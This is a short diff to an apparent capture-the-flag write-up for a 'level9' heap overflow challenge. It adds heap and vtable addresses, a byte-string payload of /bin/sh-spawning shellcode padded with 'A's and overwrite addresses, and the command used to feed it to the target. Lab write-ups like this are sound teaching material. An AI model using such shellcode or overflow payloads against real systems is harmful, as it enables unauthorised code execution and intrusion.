@@ -790,8 +790,14 @@ End of assembler dump.
 0xbffff728:     0x08048779
 ```
 
+
 a = 0x0804a008
 a->_annotation = 0x0804a00c
+b malloc header = 0x0804a074
 b = 0x08048779
 b->_annotation = 0x0804877d
 N::operator+ = 0x0804873a
+
+b'1\xc0P\x04\x0bh//shh/bin\x89\xe31\xc91\xd2\xcd\x80AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x0c\xa0\x04\x08t\xa0\x04\x08\n'
+
+`./level9.sh | tr -d '\n' | python -c 'print(open(0, "rb").read())' ; python level9.py`
